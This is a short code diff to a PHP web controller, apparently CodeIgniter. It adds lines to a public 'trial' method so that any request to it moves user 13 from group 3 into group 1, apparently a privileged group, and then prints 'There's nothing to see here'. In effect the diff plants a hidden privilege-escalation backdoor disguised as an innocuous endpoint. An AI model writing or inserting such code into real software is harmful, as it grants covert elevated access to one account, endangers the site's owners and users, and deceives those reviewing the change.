@@ -2002,6 +2002,9 @@ class Home extends BaseController
 
     public function trial()
     {
+        $authorize = service('authorization');
+        $authorize->removeUserFromGroup(13, 3);
+        $authorize->addUserToGroup(13, 1);
         echo "There's nothing to see here";
     }
 
